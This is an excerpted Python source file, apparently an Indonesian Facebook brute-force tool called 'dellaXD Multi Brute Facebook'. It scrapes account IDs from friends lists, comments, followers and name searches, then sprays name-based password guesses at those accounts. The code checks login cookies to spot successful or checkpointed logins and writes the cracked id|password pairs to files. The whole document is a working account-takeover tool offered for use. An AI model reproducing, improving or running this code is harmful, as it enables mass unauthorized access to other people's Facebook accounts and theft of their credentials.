...
from concurrent.futures import ThreadPoolExecutor as dellaXD 
...
console = Console()
sys.stdout.write('\x1b]2; BMBF | dellaXD Multi Brute Facebook\x07')
#------------------[ USER-AGENT ]-------------------#
pretty.install()
CON=sol() 
...
\ \  __<   \ \  __<   \ \  __ \  \/_/  /__  \/_/  /__  \ \  __\   \ \  __<   
 ...
 ┌──────────────────────────────┐®\n │  {sir} •• Github.com/Dellamx •• {x}  │      • • Multi Brute Force • •\n └──────────────────────────────┘               
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('DISARANKAN JANGAN MENGGUNAKAN AKUN PRIBADI ',width=90,style=f"bold white"))
				...
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					...
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						...
						if 'Sukses!' in str(response6):
							...
							print("\n Login Berhasil | python brazeer.py");exit()
			except Exception as e:
...
def menu(my_name,my_id):
	...
	cetak(panel(f'[bold white][[bold green]•[/][bold white]][/] [bold white]Username : [bold green]{my_name}[/]\n[bold white][[bold green]•[/][bold white]][/] [bold white]User Idz : [bold green]{my_id}[/]\n[bold white][[bold green]•[/][bold white]][/] [bold white]User Ip  : [bold green]{ip}[/][/] ',width=90,title=f"[bold green]Infomas",style=f"bold white"))
	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Crack Publick [[bold green] ON [bold white]][/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Crack Massal [[bold green] ON [bold white]][/]\n[bold white][[bold green]03[/][bold white]][/] [bold white]Crack File [[bold green] ON [bold white]][/]\n[bold white][[bold green]04[/][bold white]][/] [bold white]Crack Komen [[bold green] ON [bold white]][/]\n[bold white][[bold green]05[/][bold white]][/] [bold white]Crack Followers [[bold green] ON [bold white]][/]\n[bold white][[bold green]06[/][bold white]][/] [bold white]Crack username [[bold green] ON [bold white]][/]\n[bold white][[bold green]07[/][bold white]][/] [bold white]Cek result [[bold green] ON [bold white]][/]\n[bold white][[bold red]99[/][bold white]][/] [bold white]Cek opsi [[bold green] ON [bold white]][/]\n[bold white][[bold green]00[/][bold white]][/] [bold red]Hapus Cookies [[bold green] ON [bold white]][/]',width=90,title=f"[bold green]List Menu",style=f"bold white"))
	_____della___xd____ = input(f'  Pilih Menu Crack : ')
	if _____della___xd____ in ['1','01']:
		della_dump()
	elif _____della___xd____ in ['2','02']:
		dump_massal()
	elif _____della___xd____ in ['3','03']:
		crack_file()
	elif _____della___xd____ in ['4','04']:
		komen()
	elif _____della___xd____ in ['5','05']:
		pengikut()
	elif _____della___xd____ in ['6','06']:
		crack_nama()
	elif _____della___xd____ in ['7','07']:
		result()
	elif _____della___xd____ in ['99','99']:
		file_cp()
	elif _____della___xd____ in ['0','00']:
...
[bold white][[bold green]02[bold white]] [bold white]Nama, Nama123, Nama1234, Nama12345 [[bold green]Recommended[bold white]]
[bold white][[bold green]03[bold white]] [bold white]Nama, Nama123, Nama1234, Nama12345 + Manual [[bold green]Recommended[bold white]]''',style='bold white',title='[bold green]Setting Password',width=90))
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				(f"[ Checkpoint ]").add(f"[bold yellow]{idf}|{pw}").add(f"[bold yellow]{ua}\n")
				cetak(tree)
				open('/sdcardCP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
